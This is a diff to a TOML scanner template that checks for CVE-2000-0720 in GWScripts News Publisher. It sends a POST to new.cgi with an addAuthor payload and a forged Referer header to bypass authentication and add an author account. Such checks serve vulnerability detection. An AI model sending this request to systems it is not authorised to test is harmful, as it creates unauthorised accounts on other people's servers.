@@ -1,43 +1,32 @@
 [info]
-author = "AVE"
-description = "检测 GWScripts News Publisher 的 news.cgi 是否存在未授权添加作者漏洞。通过向 new.cgi 发送包含 addAuthor 参数的 POST 请求并伪造 Referer 头，验证是否可绕过身份验证添加作者。"
+author = "ave"
+description = "GWScripts News Publisher 1.0 的 news.cgi 存在认证绕过漏洞，程序在处理 addAuthor 参数添加作者时未进行有效的身份验证，仅通过检查 HTTP Referer 头是否指向 news.cgi 来判断请求合法性。远程攻击者可构造 POST 请求，将 Referer 设置为 news.cgi 的 URL，从而绕过认证机制，向作者索引文件中写入任意新作者账户"
 id = "POC-AVE-2000-0561"
-name = "GWScripts News Publisher 未授权添加作者 PoC"
+name = "CVE-2000-0720 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-0720",
-    "gwscripts",
-    "news-publisher",
-    "cgi",
-]
+tags = ["ave-2000-0561"]
 vuln_id = [
     "CVE-2000-0720",
     "AVE-2000-0561",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/new.cgi"
+path = "/cgi-bin/new.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "addAuthor=1&author_name=ave_test&author_email=test@ave.com"
-type = "raw"
+content = "addAuthor=ave_poc_user&password=ave_poc_pass"
+type = "form"
 
 [poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-Referer = "{{BaseURL}}/news.cgi"
-User-Agent = "AVE/1.0"
+Referer = "http://{{Hostname}}/cgi-bin/news.cgi"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "author",
-    "added",
-    "success",
-]
+words = ["author"]
